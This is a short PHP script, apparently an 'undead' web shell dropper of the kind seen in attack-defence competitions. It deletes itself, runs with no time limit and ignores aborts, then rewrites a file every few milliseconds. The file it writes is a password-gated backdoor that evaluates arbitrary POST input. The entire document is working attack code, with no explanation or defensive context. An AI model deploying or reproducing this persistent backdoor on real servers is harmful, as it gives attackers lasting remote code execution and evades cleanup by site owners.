<?php 
	//By ZacharyZcR
	ignore_user_abort(true);
	set_time_limit(0);
	unlink(__FILE__);
	$file = '需要改成.php';
	$code = '<?php if(md5($_GET["pass"])=="507f546195544d36a02a24f1e73eb773"){@eval($_POST[a]);} ?>';
	while (1){
		file_put_contents($file,$code);
		usleep(5000);
}
?>
